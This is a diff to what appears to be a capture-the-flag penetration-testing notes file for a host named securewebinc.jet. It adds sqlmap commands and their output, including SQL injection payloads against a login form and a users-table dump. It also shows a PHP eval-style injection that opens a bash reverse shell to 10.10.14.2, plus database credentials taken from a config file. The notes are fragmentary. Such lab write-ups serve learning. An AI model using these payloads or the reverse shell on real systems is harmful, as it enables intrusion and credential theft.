@@ -53,16 +53,74 @@ PORT     STATE SERVICE
 
 - [+] : 
    >>	
+└──╼ $sqlmap -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=admin"
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 6234=6234 AND 'glnu'='glnu&password=admin
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 2321 FROM(SELECT COUNT(*),CONCAT(0x716a627071,(SELECT (ELT(2321=2321,1))),0x7171706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'lDEi'='lDEi&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 4067 FROM (SELECT(SLEEP(5)))FnPm) AND 'tDUA'='tDUA&password=admin
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-1736' UNION ALL SELECT NULL,CONCAT(0x716a627071,0x636a72644a4e42544c6e7050567a564c576d436c537a416f7a524742776b7454444374455363464b,0x7171706271),NULL-- -&password=admin
+---
+[04:02:05] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3, PHP
+back-end DBMS: MySQL >= 5.0
+[04:02:06] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/www.securewebinc.jet'
+
+[*] ending @ 04:02:06 /2024-07-07/
+
+
+available databases [2]:                                                       
+[*] information_schema
+[*] jetadmin
+
+$sqlmap -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=admin" -D jetadmin -T users --columns --dump --batch
+Hackthesystem200
+
+*/e
+system('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/1234 0>&1"')
+
 
 - [+] : 
    >>	
 
+$servername = "localhost";
+$username = "jet";
+$password = "dcr46kdl6zsld68idtyufldro";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password,'jetadmin');
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+/* User Creation
+$username = 'admin';
+$password = 'apasswordhere';
+$hashPassword = password_hash($password,PASSWORD_BCRYPT);
+
+$sql = "insert into users (username, password) valu
 
 ## - RECON -
 
 - [+] : 
    >>	
-
+--data=username=admin&
 - [+] : 
    >>	
 
